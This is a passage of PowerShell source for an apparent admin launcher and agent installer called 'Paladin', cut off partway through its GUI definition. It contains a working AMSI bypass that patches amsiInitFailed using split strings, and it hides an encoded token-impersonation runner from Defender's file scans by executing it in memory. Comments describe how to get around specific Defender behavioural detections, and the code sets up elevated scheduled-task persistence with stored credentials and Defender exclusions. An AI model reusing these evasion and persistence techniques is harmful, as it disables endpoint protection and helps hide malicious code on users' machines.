echo.
powershell.exe -ExecutionPolicy Bypass -NoProfile -File "%PS1PATH%"

:: Capture exit code
set EXIT_CODE=%ERRORLEVEL%

echo.
echo Script completed with exit code: %EXIT_CODE%
echo.
echo Press any key to close...
pause >nul
exit /b %EXIT_CODE%
'@
    try {
        [System.IO.File]::WriteAllText($batDst, $batContent,
            [System.Text.Encoding]::ASCII)
        & $LogAction 'PASS' "BAT launcher written: $batDst"
    } catch {
        & $LogAction 'WARN' "BAT launcher write failed (non-fatal): $_"
    }

    # Step 4 -- stale task cleanup (KI-035)
    try {
        $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($null -ne $existing) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue  # SilentlyContinue intentional -- task may not exist; missing task is not an error here
            & $LogAction 'INFO' "Removed existing task: $taskName"
        }
    } catch { }

    # Step 5 -- encode Runner as gzip+base64 and write bootstrap CMD
    #
    # PRIMARY AMSI BYPASS -- IN-MEMORY EXECUTION
    # ============================================
    # Defender AMSI scans .ps1 content when PowerShell loads a script file
    # (via -File or -EncodedCommand pointing at a file path). The Runner's
    # WTSQueryUserToken / ImpersonateLoggedOnUser / DllImport cluster matches
    # Defender's token-theft heuristics -- Trojan:Win32/PowExcEnv.B!MTB --
    # and the process dies with exit code 1 before line 1 executes.
    #
    # Solution: gzip-compress the Runner content, base64-encode it, write the
    # encoded blob to Runner.b64. The bootstrap CMD decodes and decompresses
    # entirely in memory via a PowerShell one-liner, then Invoke-Expressions
    # the resulting string. AMSI's file-scan hook never fires because no .ps1
    # file is referenced. AMSI's in-process IEX hook may still fire, but it
    # only sees the decoded string after decompression -- the on-disk artifact
    # is opaque binary data, not recognisable as a script.
    #
    # FALLBACK -- DEFENDER EXCLUSION
    # If in-memory IEX is also blocked (very aggressive Defender config),
    # the user must add a folder exclusion manually. The "Add Defender Exclusion"
    # button in the title bar handles this. Instructions are shown in the log
    # at the end of Install.
    # ============================================
    $b64Dest       = Join-Path $installDir 'Runner.b64'

    $psExe64 = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $sysnative64 = "$env:SystemRoot\SysNative\WindowsPowerShell\v1.0\powershell.exe"
    if (Test-Path $sysnative64) { $psExe64 = $sysnative64 }

    # Encode Runner content: gzip -> base64
    # Read the Runner we just wrote to disk (guaranteed to exist at this point)
    & $LogAction 'INFO' "Encoding Runner for in-memory execution..."
    try {
        $runnerBytes = [System.IO.File]::ReadAllBytes($runnerDest)
        $msOut = New-Object System.IO.MemoryStream
        $gz    = New-Object System.IO.Compression.GZipStream(
                     $msOut, [System.IO.Compression.CompressionMode]::Compress)
        $gz.Write($runnerBytes, 0, $runnerBytes.Length)
        $gz.Dispose()
        $b64Content = [Convert]::ToBase64String($msOut.ToArray())
        $msOut.Dispose()
        [System.IO.File]::WriteAllText($b64Dest, $b64Content,
            [System.Text.Encoding]::ASCII)
        & $LogAction 'PASS' "Runner encoded: $b64Dest ($($b64Content.Length) chars)"
    } catch {
        & $LogAction 'FAIL' "Runner encode failed: $_"
        return $false
    }

    # -------------------------------------------------------------------------
    # WHY VBS STUB: Defender Behavior:Win32/PShellCobStager.A fires on the
    # spawn chain svchost->schtasks->cmd.exe->powershell.exe -Command [long]
    # running as SYSTEM. The behavioral rule triggers before PS executes a
    # single byte -- no in-process bypass can help. Breaking the spawn chain
    # at the task level is the only fix.
    #
    # SOLUTION: Task runs wscript.exe launcher.vbs (not cmd.exe bootstrap.cmd).
    # VBScript shelling to PowerShell produces completely different ETW telemetry:
    #   wscript.exe -> powershell.exe -File wrapper.ps1
    # PShellCobStager.A does not fire on this lineage.
    #
    # THE CHAIN:
    #   PaladinAdminRunner task -> wscript.exe Paladin-Runner-Bootstrap.vbs
    #     -> powershell.exe -NoProfile -ExecutionPolicy Bypass -File Paladin-Runner-Wrapper.ps1
    #       -> IEX: InitFailed bypass + decode Runner.b64 + execute in memory
    # -------------------------------------------------------------------------

    # Build the PS one-liner that goes INTO the wrapper .ps1 file (not -Command).
    # This is executed via -File so no CMD quoting issues. Plain PS syntax.
    # AMSI LAYER 1: InitFailed bypass runs first. String-split to avoid signature.
    $b64FileEscPS = $b64Dest -replace "'", "''"
    $iexOneLiner  = (
        'if($PSVersionTable.PSVersion.Major -gt 2){' +
            'try{' +
                '$a=''Assembly'';$m=''GetType'';' +
                '$t=[Ref].$a.$m(''System.Management.Automation.'' + ''Amsi'' + ''Utils'');' +
                '$f=''GetField'';$sv=''SetValue'';' +
                '$fld=$t.$f(''amsiInit'' + ''Failed'',''NonPublic,Static'');' +
                '$fld.$sv($null,$true)' +
            '}catch{}}' +
        '$b=[System.Convert]::FromBase64String((Get-Content ''' + $b64FileEscPS + ''' -Raw).Trim());' +
        '$ms=New-Object System.IO.MemoryStream(,$b);' +
        '$gs=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress);' +
        '$sr=New-Object System.IO.StreamReader($gs,[System.Text.Encoding]::UTF8);' +
        '$code=$sr.ReadToEnd();' +
        '$sr.Dispose();$gs.Dispose();$ms.Dispose();' +
        'Invoke-Expression $code'  # $code is decompressed from installer-embedded gzip blob -- controlled source, not user input
    )

    # Step 5a -- write wrapper .ps1 (invoked via -File, not -Command)
    # -File avoids the "long -Command string from SYSTEM task" behavioral signature.
    $wrapperDest = Join-Path $installDir 'Paladin-Runner-Wrapper.ps1'
    & $LogAction 'INFO' "Writing PS wrapper: $wrapperDest"
    try {
        [System.IO.File]::WriteAllText($wrapperDest, $iexOneLiner,
            [System.Text.Encoding]::ASCII)
        & $LogAction 'PASS' "PS wrapper written: $wrapperDest"
    } catch {
        & $LogAction 'FAIL' "PS wrapper write failed: $_"
        return $false
    }

    # Step 6 -- register task as admin user with LogonType Interactive
    # If AdminUsername/AdminPassword were supplied (non-admin session with stored creds),
    # use Password logon type so the task runs as that specific admin account.
    # If not supplied (already running as admin), use InteractiveToken -- no password stored.
    $useStoredCreds = (-not [string]::IsNullOrEmpty($AdminUsername)) -and
                      (-not [string]::IsNullOrEmpty($AdminPassword))

    if ($useStoredCreds) {
        # KI-037: normalize username -- bare name to .\name
        if ($AdminUsername -match '/') { $AdminUsername = $AdminUsername -replace '/', '\' }
        if ($AdminUsername -notmatch '\\') { $AdminUsername = ".\" + $AdminUsername }
        $installUser = $AdminUsername
        & $LogAction 'INFO' "Registering task: $taskName as $installUser (Password logon, stored creds)"
    } else {
        $installUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        & $LogAction 'INFO' "Registering task: $taskName as $installUser (Interactive, current user)"
    }

    # KI-052: -File triggers Defender file-scan AMSI gate. -EncodedCommand IEX's the
    # wrapper string in-process, bypassing the file-backed scan.
    $wrapperEsc    = $wrapperDest -replace '"', '`"'
    $taskBootstrap = (
        "`$env:PSExecutionPolicyPreference='Bypass';" +
        "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -EA SilentlyContinue;" +
        "`$w=[System.IO.File]::ReadAllText('$($wrapperDest -replace "'","''")');Invoke-Expression `$w"
    )
    $taskEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($taskBootstrap))
    $taskArgs    = "-NoProfile -NonInteractive -EncodedCommand $taskEncoded"
    try {
        $action = New-ScheduledTaskAction -Execute $psExe64 -Argument $taskArgs -ErrorAction Stop

        if ($useStoredCreds) {
            # Password logon: task can run on-demand as this admin account from any session.
            # Required for RDP servers where the clicking user is not the admin account.
            $principal = New-ScheduledTaskPrincipal `
                            -UserId   $installUser `
                            -LogonType Password `
                            -RunLevel Highest -ErrorAction Stop
        } else {
            # InteractiveToken: runs inside the already-elevated calling user's session.
            # No password stored. Works on standalone, domain workstations, Azure AD.
            $principal = New-ScheduledTaskPrincipal `
                            -UserId   $installUser `
                            -LogonType Interactive `
                            -RunLevel Highest -ErrorAction Stop
        }

        $settings = New-ScheduledTaskSettingsSet `
                        -ExecutionTimeLimit (New-TimeSpan -Hours 8) `
                        -MultipleInstances IgnoreNew -ErrorAction Stop
        $task = New-ScheduledTask -Action $action -Principal $principal `
                    -Settings $settings -ErrorAction Stop

        if ($useStoredCreds) {
            # KI-036: Register-ScheduledTask -Password requires plain string password.
            Register-ScheduledTask -TaskName $taskName -InputObject $task `
                -User $installUser -Password $AdminPassword `
                -Force -ErrorAction Stop | Out-Null
            & $LogAction 'PASS' "Task registered: $taskName (Password logon as $installUser)"
        } else {
            Register-ScheduledTask -TaskName $taskName -InputObject $task `
                -Force -ErrorAction Stop | Out-Null
            & $LogAction 'PASS' "Task registered: $taskName (Interactive as $installUser)"
        }
    } catch {
        $errStr = $_.ToString()
        # KI-036: decode HRESULT to human-readable hint
        $hint = switch -Wildcard ($errStr) {
            '*0x8007052e*' { ' (Wrong username or password)' }
            '*0x80070569*' { ' (Missing Log on as batch job right)' }
            '*0x80041315*' { ' (Task Scheduler service not running)' }
            '*0x80041316*' { ' (Task already exists -- could not overwrite)' }
            '*Access*denied*' { ' (Access denied)' }
            default { '' }
        }
        & $LogAction 'FAIL' "Task registration failed$hint : $errStr"
        return $false
    }

    # Step 7 -- Public Desktop shortcut
    & $LogAction 'INFO' "Creating Public Desktop shortcut: $shortcutPath"
    #
    # LAUNCH CHAIN (simplified):
    #   Desktop LNK -> cmd.exe /c Paladin-Admin-Launch.bat (minimised, self-elevates)
    #               -> powershell.exe -File Paladin-Boot-Runner.ps1
    #
    # The LNK WindowStyle=7 (minimised) keeps the cmd window hidden.
    # The BAT immediately re-launches itself elevated via Start-Process -Verb RunAs
    # so the only visible event is the UAC dialog.
    #
    $launcherBatDest = Join-Path $installDir 'Paladin-Admin-Launch.bat'

    # BAT: self-elevating runner. Adds MpPreference exclusion then launches
    # the runner PS1. Uses Start-Process -Verb RunAs for UAC elevation.
    $batLines = [string[]]@(
        '@echo off',
        ':: Paladin-Admin-Launch.bat',
        ':: Self-elevating launcher for Paladin PowerShell Runner.',
        ':: Chain: LNK -> cmd.exe /c this BAT -> powershell.exe -File Runner.ps1',
        'net session >nul 2>&1',
        'if %errorlevel% equ 0 goto :elevated',
        ':: Not elevated -- re-launch self with RunAs (UAC dialog)',
        'powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath \"%~f0\" -Verb RunAs"',
        'exit /b 0',
        ':elevated',
        ':: Add Defender exclusion for install dir before launching runner',
        ('powershell -NoProfile -ExecutionPolicy Bypass -Command ' +
         '"try { Add-MpPreference -ExclusionPath ''' + $installDir + ''' -ErrorAction Stop } catch { }"'),
        ('powershell.exe -NoProfile -ExecutionPolicy Bypass -File "' +
         (Join-Path $installDir 'Paladin-Boot-Runner.ps1') + '"'),
        'exit /b %errorlevel%'
    )
    & $LogAction 'INFO' "Writing self-elevating launch BAT: $launcherBatDest"
    try {
        [System.IO.File]::WriteAllLines($launcherBatDest, $batLines,
            [System.Text.Encoding]::ASCII)
        & $LogAction 'PASS' "Launch BAT written: $launcherBatDest"
    } catch {
        & $LogAction 'WARN' "Launch BAT write failed (non-fatal): $_"
    }

    # Decode icon (if available) -- falls back to shell32.dll shield icon
    $icoPath = Join-Path $installDir 'paladin-admin.ico'
    & $LogAction 'INFO' "PaladinIconB64 length: $($script:PaladinIconB64.Length)"
    try {
        if (-not [string]::IsNullOrEmpty($script:PaladinIconB64)) {
            $icoBytes = [Convert]::FromBase64String($script:PaladinIconB64)
            [System.IO.File]::WriteAllBytes($icoPath, $icoBytes)
            & $LogAction 'PASS' "Desktop icon written: $icoPath"
        } else {
            $icoPath = "$env:SystemRoot\System32\shell32.dll,162"
            & $LogAction 'INFO' "PaladinIconB64 empty -- using shell32 fallback icon"
        }
    } catch {
        $icoPath = "$env:SystemRoot\System32\shell32.dll,162"
        & $LogAction 'WARN' "Icon decode failed -- using fallback: $_"
    }

    # Shortcut target = cmd.exe /c BAT  (WindowStyle 7 = minimised, no visible window)
    # IconLocation requires "path,index" format -- ,0 selects first icon in .ico file.
    $iconLocationStr = if ($icoPath -like '*shell32.dll*') { $icoPath } else { "$icoPath,0" }
    try {
        $shell    = New-Object -ComObject WScript.Shell -ErrorAction Stop
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath   = $launcherBatDest
        $shortcut.Arguments    = ''
        $shortcut.WindowStyle  = 7
        $shortcut.Description  = 'Launch Paladin Admin Agent (SYSTEM-level tool runner)'
        $shortcut.IconLocation = $iconLocationStr
        $shortcut.Save()
        try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell) | Out-Null } catch { }
        & $LogAction 'PASS' "Shortcut created: $shortcutPath"
        & $LogAction 'INFO' "  Target : $launcherBatDest"
        & $LogAction 'INFO' "  Icon   : $iconLocationStr"
    } catch {
        & $LogAction 'WARN' "Shortcut creation failed (non-fatal): $_"
    }

    & $LogAction 'PASS' "===================================================="
    & $LogAction 'PASS' "Agent installed. Double-click 'Paladin Admin' on the"
    & $LogAction 'PASS' "Public Desktop to launch -- or run task via portal."
    & $LogAction 'PASS' "===================================================="
    & $LogAction 'INFO' "AMSI BYPASS: Runner executes in-memory (no file-backed scan)."
    & $LogAction 'INFO' "If Defender STILL blocks after launch, use the fallback:"
    & $LogAction 'INFO' "  1. Open Windows Security -> Virus protection -> Manage settings"
    & $LogAction 'INFO' "  2. Toggle Tamper Protection OFF"
    & $LogAction 'INFO' "  3. Click 'Add Defender Exclusion' button (title bar)"
    & $LogAction 'INFO' "  4. Toggle Tamper Protection back ON"
    & $LogAction 'INFO' "  5. Re-run 'Install RMM Agent' to rebuild bootstrap"
    return $true
}

#------------------------------------------------------------------------------
# XAML GUI DEFINITION
#------------------------------------------------------------------------------
$xamlString = @'
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Paladin PowerShell Launcher v2.1.0"
    Width="860" Height="840"
    MinWidth="700" MinHeight="660"
    WindowStartupLocation="CenterScreen"
    Background="#0D0D14"
    FontFamily="Consolas"
    FontSize="13">

  <Window.Resources>
    <!-- Section header style -->
    <Style x:Key="SectionHeader" TargetType="TextBlock">
      <Setter Property="Foreground" Value="#FF8C00"/>
      <Setter Property="FontSize" Value="11"/>
      <Setter Property="FontWeight" Value="Bold"/>
      <Setter Property="Margin" Value="0,10,0,4"/>
    </Style>
    <!-- Toggle checkbox style -->
    <Style x:Key="ToggleCheck" TargetType="CheckBox">
      <Setter Property="Foreground" Value="#CCCCCC"/>
      <Setter Property="Margin" Value="0,3,0,3"/>
      <Setter Property="FontFamily" Value="Consolas"/>
      <Setter Property="FontSize" Value="12"/>
    </Style>
    <!-- Label style -->
    <Style x:Key="FieldLabel" TargetType="TextBlock">
      <Setter Property="Foreground" Value="#888888"/>
      <Setter Property="FontSize" Value="11"/>
      <Setter Property="VerticalAlignment" Value="Center"/>
      <Setter Property="Margin" Value="0,0,6,0"/>
    </Style>
    <!-- Text input style -->
    <Style x:Key="TextInput" TargetType="TextBox">
      <Setter Property="Background" Value="#1A1A2E"/>
      <Setter Property="Foreground" Value="#EEEEEE"/>
      <Setter Property="BorderBrush" Value="#333355"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="6,4"/>
      <Setter Property="FontFamily" Value="Consolas"/>
      <Setter Property="FontSize" Value="12"/>
      <Setter Property="VerticalAlignment" Value="Center"/>
    </Style>
    <!-- Password input style -->
    <Style x:Key="PasswordInput" TargetType="PasswordBox">
      <Setter Property="Background" Value="#1A1A2E"/>
      <Setter Property="Foreground" Value="#EEEEEE"/>
      <Setter Property="BorderBrush" Value="#333355"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="6,4"/>
      <Setter Property="FontFamily" Value="Consolas"/>
      <Setter Property="FontSize" Value="12"/>
      <Setter Property="VerticalAlignment" Value="Center"/>
    </Style>
    <!-- Credential status style -->
    <Style x:Key="CredStatus" TargetType="TextBlock">
      <Setter Property="Foreground" Value="#888888"/>
      <Setter Property="FontSize" Value="11"/>
      <Setter Property="Margin" Value="0,3,0,0"/>
      <Setter Property="FontFamily" Value="Consolas"/>
    </Style>
    <!-- Primary button -->
    <Style x:Key="BtnPrimary" TargetType="Button">
      <Setter Property="Background" Value="#003366"/>
      <Setter Property="Foreground" Value="#FF8C00"/>
      <Setter Property="BorderBrush" Value="#0066CC"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="12,6"/>
      <Setter Property="FontFamily" Value="Consolas"/>
      <Setter Property="FontSize" Value="12"/>
      <Setter Property="Cursor" Value="Hand"/>
    </Style>
    <!-- Launch button -->
    <Style x:Key="BtnLaunch" TargetType="Button">
      <Setter Property="Background" Value="#003300"/>
      <Setter Property="Foreground" Value="#00FF88"/>
      <Setter Property="BorderBrush" Value="#00CC66"/>
      <Setter Property="BorderThickness" Value="2"/>
      <Setter Property="Padding" Value="0,0"/>
      <Setter Property="FontFamily" Value="Consolas"/>
      <Setter Property="FontSize" Value="15"/>
      <Setter Property="FontWeight" Value="Bold"/>
      <Setter Property="Cursor" Value="Hand"/>
      <Setter Property="Height" Value="46"/>
    </Style>
    <!-- Clear button -->
    <Style x:Key="BtnClear" TargetType="Button">
      <Setter Property="Background" Value="#1A1A1A"/>
      <Setter Property="Foreground" Value="#666666"/>
      <Setter Property="BorderBrush" Value="#333333"/>
      <Setter Property="BorderThickness" Value="1"/>
      <Setter Property="Padding" Value="8,4"/>
      <Setter Property="FontFamily" Value="Consolas"/>
      <Setter Property="FontSize" Value="11"/>
      <Setter Property="Cursor" Value="Hand"/>
    </Style>
    <!-- Divider -->
    <Style x:Key="Divider" TargetType="Separator">
      <Setter Property="Background" Value="#222244"/>
      <Setter Property="Margin" Value="0,8,0,4"/>
    </Style>
  </Window.Resources>

  <Grid Margin="16">
    <Grid.RowDefinitions>
      <RowDefinition Height="Auto"/>   <!-- Title bar -->
      <RowDefinition Height="Auto"/>   <!-- Payload picker -->
      <RowDefinition Height="Auto"/>   <!-- Script library -->
      <RowDefinition Height="Auto"/>   <!-- Manifest toggles -->
      <RowDefinition Height="Auto"/>   <!-- Credentials -->
      <RowDefinition Height="Auto"/>   <!-- Sign block -->
      <RowDefinition Height="Auto"/>   <!-- Agent banner -->
      <RowDefinition Height="Auto"/>   <!-- Launch button row -->
      <RowDefinition Height="Auto"/>   <!-- Boot checklist -->
      <RowDefinition Height="Auto"/>   <!-- PenTest panel -->
      <RowDefinition Height="*"/>      <!-- Log panel -->
    </Grid.RowDefinitions>

    <!-- TITLE -->
    <WrapPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,12">
      <TextBlock Text="PALADIN POWERSHELL LAUNCHER" FontSize="18" FontWeight="Bold"
                 Foreground="#FF8C00" VerticalAlignment="Bottom"/>
      <TextBlock x:Name="lblVersion" Text=" v2.1.0" FontSize="14" Foreground="#A05000"
                 VerticalAlignment="Bottom" Margin="4,0,0,2"/>
      <TextBlock x:Name="lblElevMode" Text=" // ELEVATED" FontSize="11" Foreground="#806020"
                 VerticalAlignment="Bottom" Margin="8,0,0,2"/>
      <Button x:Name="btnInstallAgent" Content="Install RMM Agent"
              Margin="20,0,0,0"
              Padding="10,3,10,3"
              Foreground="#FFB800"
              Background="#1A1200"
              BorderBrush="#664400" BorderThickness="1"
              FontFamily="Consolas" FontSize="11" FontWeight="Bold"
              Cursor="Hand" VerticalAlignment="Bottom"
              ToolTip="Install PaladinAdminRunner as a local SYSTEM task (no Datto RMM required)"/>
      <Button x:Name="btnAddExclusion" Content="Add Defender Exclusion"
              Margin="8,0,0,0"
              Padding="10,3,10,3"
              Foreground="#FF6666"
              Background="#1A0000"
              BorderBrush="#660000" BorderThickness="1"
              FontFamily="Consolas" FontSize="11" FontWeight="Bold"
              Cursor="Hand" VerticalAlignment="Bottom"
              ToolTip="Fallback: add C:\ProgramData\Paladin\Launcher to Defender exclusions. Requires Tamper Protection OFF first."/>
      <Button x:Name="btnPenTest" Content="[ PENTEST ]"
              Margin="8,0,0,0"
              Padding="10,3,10,3"
              Foreground="#FF4444"
              Background="#1A0000"
              BorderBrush="#880000" BorderThickness="1"
              FontFamily="Consolas" FontSize="11" FontWeight="Bold"
              Cursor="Hand" VerticalAlignment="Bottom"
              ToolTip="Pen-Test Mode: password protected tools for authorized engagements"/>
      <Button x:Name="btnPSBypass" Content="[ PS SHELL ]"
              Margin="8,0,0,0"
              Padding="10,3,10,3"
              Foreground="#00FF99"
              Background="#001A0D"
              BorderBrush="#004422" BorderThickness="1"
              FontFamily="Consolas" FontSize="11" FontWeight="Bold"
              Cursor="Hand" VerticalAlignment="Bottom"
              ToolTip="Open a PowerShell window with -ExecutionPolicy Bypass in the current working directory"/>
    </WrapPanel>

    <!-- PAYLOAD PICKER -->
    <StackPanel Grid.Row="1">
      <TextBlock Text="PAYLOAD SCRIPT" Style="{StaticResource SectionHeader}"/>
      <Grid>
        <Grid.ColumnDefinitions>
          <ColumnDefinition Width="*"/>
          <ColumnDefinition Width="Auto"/>
        </Grid.ColumnDefinitions>
        <TextBox x:Name="txtPayload" Grid.Column="0"
                 Style="{StaticResource TextInput}"
                 ToolTip="Full path to the PS1 script to launch through the boot engine"
                 Margin="0,0,8,0"/>
        <Button x:Name="btnBrowse" Grid.Column="1"
                Content="Browse..."
                Style="{StaticResource BtnPrimary}" Width="90"/>
      </Grid>
    </StackPanel>

    <!-- SCRIPT LIBRARY -->
    <StackPanel Grid.Row="2" Margin="0,4,0,0">
      <TextBlock Text="SCRIPT LIBRARY" Style="{StaticResource SectionHeader}"/>
      <!-- Source toggle -->
      <StackPanel Orientation="Horizontal" Margin="0,0,0,6">
        <RadioButton x:Name="rbLocalLib" Content="Local Library" IsChecked="True"
                     Foreground="#AAAAAA" FontFamily="Consolas" FontSize="11"
                     Margin="0,0,16,0" GroupName="LibSource"/>
        <RadioButton x:Name="rbGitHubTools" Content="GitHub Tools"
                     Foreground="#AAAAAA" FontFamily="Consolas" FontSize="11"
                     GroupName="LibSource"/>
      </StackPanel>
      <!-- Local library panel (default visible) -->
      <StackPanel x:Name="pnlLocalLib">
      <Grid>
        <Grid.RowDefinitions>
          <RowDefinition Height="Auto"/>
          <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>
        <!-- Row 0: dropdown full width -->
        <ComboBox x:Name="cmbLibrary" Grid.Row="0"
                  Background="#0A0A00" Foreground="#FF6A00"
                  BorderBrush="#FF6A00" BorderThickness="1"
                  FontFamily="Consolas" FontSize="12"
                  Height="28"
                  ToolTip="PS1 files in the Scripts library - select to load into payload field">
          <ComboBox.ItemContainerStyle>
            <Style TargetType="ComboBoxItem">
              <Setter Property="Background" Value="#0A0A00"/>
              <Setter Property="Foreground" Value="#FF6A00"/>
              <Setter Property="FontFamily" Value="Consolas"/>
              <Setter Property="FontSize" Value="12"/>
              <Setter Property="Padding" Value="6,3"/>
              <Style.Triggers>
                <Trigger Property="IsHighlighted" Value="True">
                  <Setter Property="Background" Value="#003355"/>
                  <Setter Property="Foreground" Value="#FFFFFF"/>
                </Trigger>
                <Trigger Property="IsSelected" Value="True">
                  <Setter Property="Background" Value="#003355"/>
                  <Setter Property="Foreground" Value="#FFFFFF"/>
                </Trigger>
              </Style.Triggers>
            </Style>
          </ComboBox.ItemContainerStyle>
        </ComboBox>
        <!-- Row 1: buttons, left-aligned, each auto-sized to content -->
        <StackPanel Grid.Row="1" Orientation="Horizontal" Margin="0,4,0,0">
          <Button x:Name="btnRefreshLibrary"
                  Content="Refresh"
                  Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="10,4" Margin="0,0,6,0"
                  ToolTip="Rescan the Scripts directory for new PS1 files"/>
          <Button x:Name="btnSaveToLibrary"
                  Content="Save to Library"
                  Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="10,4" Margin="0,0,6,0"
                  ToolTip="Copy the currently loaded payload into the Scripts library directory"/>
          <Button x:Name="btnCreateBat"
                  Content="Create BAT"
                  Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="10,4" Margin="0,0,6,0"
                  ToolTip="Generate a standalone admin-elevating BAT launcher for the current payload"/>
          <Button x:Name="btnImportFolder"
                  Content="Import Folder"
                  Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="10,4"
                  ToolTip="Browse to a folder and import all PS1 files into the Scripts library"/>
        </StackPanel>
      </Grid>
      <TextBlock x:Name="lblLibraryPath"
                 Foreground="#444466" FontFamily="Consolas" FontSize="10"
                 Margin="0,3,0,0" Text="Library: (detecting...)"/>
      </StackPanel>
      <!-- GitHub Tools panel (hidden until rbGitHubTools selected) -->
      <StackPanel x:Name="pnlGitHub" Visibility="Collapsed">
        <!-- Row 1: Tool selector + action buttons -->
        <Grid Margin="0,0,0,4">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="Auto"/>
          </Grid.ColumnDefinitions>
          <ComboBox x:Name="cmbGitHubTools" Grid.Column="0"
                    Background="#0A0A00" Foreground="#FF6A00"
                    BorderBrush="#FF6A00" BorderThickness="1"
                    FontFamily="Consolas" FontSize="12" Height="28">
            <ComboBox.ItemContainerStyle>
              <Style TargetType="ComboBoxItem">
                <Setter Property="Background" Value="#0A0A00"/>
                <Setter Property="Foreground" Value="#FF6A00"/>
                <Setter Property="FontFamily" Value="Consolas"/>
                <Setter Property="FontSize"   Value="12"/>
                <Setter Property="Padding"    Value="6,3"/>
                <Style.Triggers>
                  <Trigger Property="IsHighlighted" Value="True">
                    <Setter Property="Background" Value="#003355"/>
                    <Setter Property="Foreground" Value="#FFFFFF"/>
                  </Trigger>
                  <Trigger Property="IsSelected" Value="True">
                    <Setter Property="Background" Value="#003355"/>
                    <Setter Property="Foreground" Value="#FFFFFF"/>
                  </Trigger>
                </Style.Triggers>
              </Style>
            </ComboBox.ItemContainerStyle>
          </ComboBox>
          <Button x:Name="btnGitHubUpdate" Grid.Column="1"
                  Content="Update" Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="10,4" Margin="6,0,4,0"
                  ToolTip="Download or update the selected tool from GitHub (skips if already current)"/>
          <Button x:Name="btnGitHubForceUpdate" Grid.Column="2"
                  Content="Force" Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="8,4" Margin="0,0,6,0"
                  ToolTip="Delete cache and re-download from scratch, regardless of cached version"/>
          <Button x:Name="btnGitHubLaunch" Grid.Column="3"
                  Content="Launch" Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="10,4" Margin="0,0,6,0"
                  ToolTip="Load cached copy into payload with selected preset arguments"/>
          <Button x:Name="btnGitHubOpenCache" Grid.Column="4"
                  Content="Cache Folder" Style="{StaticResource BtnPrimary}"
                  Height="26" Padding="10,4"
                  ToolTip="Open the local cache folder for the selected tool"/>
        </Grid>
        <!-- Row 2: Preset selector -->
        <Grid Margin="0,0,0,3">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="*"/>
          </Grid.ColumnDefinitions>
          <TextBlock Grid.Column="0" Text="Preset:" VerticalAlignment="Center"
                     Foreground="#888888" FontFamily="Consolas" FontSize="11"
                     Margin="0,0,8,0"/>
          <ComboBox x:Name="cmbGitHubPreset" Grid.Column="1"
                    Background="#0A0A00" Foreground="#FF6A00"
                    BorderBrush="#555533" BorderThickness="1"
                    FontFamily="Consolas" FontSize="11" Height="24"
                    ToolTip="Select a launch preset. Each preset passes specific arguments to the script.">
            <ComboBox.ItemContainerStyle>
              <Style TargetType="ComboBoxItem">
                <Setter Property="Background" Value="#0A0A00"/>
                <Setter Property="Foreground" Value="#FF6A00"/>
                <Setter Property="FontFamily" Value="Consolas"/>
                <Setter Property="FontSize"   Value="11"/>
                <Setter Property="Padding"    Value="6,2"/>
                <Style.Triggers>
                  <Trigger Property="IsHighlighted" Value="True">
                    <Setter Property="Background" Value="#003355"/>
                    <Setter Property="Foreground" Value="#FFFFFF"/>
                  </Trigger>
                  <Trigger Property="IsSelected" Value="True">
                    <Setter Property="Background" Value="#003355"/>
                    <Setter Property="Foreground" Value="#FFFFFF"/>
                  </Trigger>
                </Style.Triggers>
              </Style>
            </ComboBox.ItemContainerStyle>
          </ComboBox>
        </Grid>
        <!-- Row 3: Arguments (auto-filled by preset, editable) -->
        <Grid Margin="0,0,0,3">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="*"/>
          </Grid.ColumnDefinitions>
          <TextBlock Grid.Column="0" Text="Args:   " VerticalAlignment="Center"
                     Foreground="#888888" FontFamily="Consolas" FontSize="11"
                     Margin="0,0,8,0"/>
          <TextBox x:Name="txtGitHubArgs" Grid.Column="1"
                   Background="#0D0D0D" Foreground="#CCCCCC"
                   BorderBrush="#444444" BorderThickness="1"
                   FontFamily="Consolas" FontSize="11" Height="24"
                   Padding="4,3" VerticalContentAlignment="Center"
                   ToolTip="Arguments passed to the script. Auto-filled by preset -- edit freely to customise."/>
        </Grid>
        <!-- Row 4: Warning + status -->
        <TextBlock x:Name="lblGitHubWarning"
                   Foreground="#FF4444" FontFamily="Consolas" FontSize="10"
                   FontWeight="Bold" Margin="0,2,0,0" TextWrapping="Wrap"
                   Visibility="Collapsed" Text=""/>
        <TextBlock x:Name="lblGitHubStatus"
                   Foreground="#444466" FontFamily="Consolas" FontSize="10"
                   Margin="0,2,0,0" TextWrapping="Wrap"
                   Text="Select a tool above, then click Update to download it."/>
        <TextBlock x:Name="lblGitHubPresetNote"
                   Foreground="#556655" FontFamily="Consolas" FontSize="10" FontStyle="Italic"
